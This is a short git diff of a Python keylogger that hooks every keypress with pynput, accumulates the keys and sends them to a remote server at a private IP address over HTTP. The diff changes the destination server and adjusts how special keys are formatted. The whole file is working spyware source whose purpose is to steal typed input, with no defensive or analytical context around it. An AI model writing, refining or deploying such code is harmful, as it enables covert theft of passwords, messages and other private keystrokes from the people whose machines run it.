@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener, Key
 import requests
 
-server_url = 'http://10.104.104.208:5000/get_logs'
+server_url = 'http://10.104.104.119:5000/get_logs'
 logs = ''
 
 def on_press(key):
@@ -15,7 +15,10 @@ def on_press(key):
 
         logs = ''
     else:
-        logs += str(key).replace("'","")
+        a = str(key).replace("'","")
+        if a in 'Key':
+            a = ' '+a+' '
+        logs += a
 
 with Listener(on_press=on_press) as listener:
     listener.join()
